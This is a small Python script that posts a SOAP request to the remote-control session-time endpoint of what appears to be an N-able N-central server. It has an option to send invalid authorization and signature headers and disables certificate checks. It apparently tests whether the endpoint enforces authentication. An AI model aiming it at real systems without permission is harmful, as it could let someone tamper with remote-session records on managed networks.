#!/usr/bin/env python3
import argparse
import html
import os

import requests
import urllib3


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("task_id", type=int)
    parser.add_argument("--session-id", required=True)
    parser.add_argument("--time", required=True)
    parser.add_argument("--end", action="store_true")
    parser.add_argument("--target", default="https://n-central.local/dms2/services2/ServerII2")
    parser.add_argument("--invalid-signature", action="store_true")
    args = parser.parse_args()
    body = f'''<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:i="http://ii2.nobj.nable.com/">
<s:Body><i:remoteControlMSPAStartEndTimeSubmit>
<i:mspaSessionID>{html.escape(args.session_id)}</i:mspaSessionID>
<i:remoteControlTaskId>{args.task_id}</i:remoteControlTaskId>
<i:isStart>{str(not args.end).lower()}</i:isStart>
<i:startOrEndTime>{html.escape(args.time)}</i:startOrEndTime>
</i:remoteControlMSPAStartEndTimeSubmit></s:Body></s:Envelope>'''
    headers = {"Content-Type": "application/soap+xml; charset=UTF-8"}
    if args.invalid_signature:
        headers["Authorization"] = "Bearer invalid"
        headers["X-MSPA-Signature"] = "invalid"
    proxy = os.environ.get("HTTPS_PROXY") or os.environ.get("HTTP_PROXY")
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    response = requests.post(
        args.target,
        data=body,
        headers=headers,
        proxies={"http": proxy, "https": proxy} if proxy else None,
        verify=False,
        timeout=45,
    )
    print(response.status_code)
    if response.status_code != 200:
        print(response.text)


if __name__ == "__main__":
    main()
